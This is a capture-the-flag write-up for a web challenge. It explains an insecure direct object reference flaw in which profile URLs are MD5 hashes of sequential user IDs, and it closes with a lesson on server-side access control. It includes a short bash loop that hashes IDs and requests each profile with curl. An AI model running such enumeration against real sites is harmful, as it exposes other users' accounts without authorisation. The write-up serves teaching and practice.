# Hashgate

**Category:** Web Exploitation

## Solution

* Logged in using the credentials found in the page source.
* The profile URL contained the **MD5 hash of the user's ID**.
* Guest's ID was `3000`, and its MD5 matched the URL, confirming the pattern.
* Brute-forced nearby IDs, generated their MD5 hashes, and requested the corresponding profile URLs.
* Found the admin profile and retrieved the flag.

```bash
for i in $(seq 3001 1 3030); do
    hash=$(echo -n $i | md5sum | cut -d' ' -f1)
    curl -s "TARGET_URL/profile/user/$hash"
done
```

## Concept

**Insecure Direct Object Reference (IDOR):** The application used a predictable user ID to identify profiles and only obscured it using MD5. Hashing an identifier does not provide access control.

**Key Takeaway:** Never rely on obscurity or hashed IDs for authorization; enforce server-side access controls.
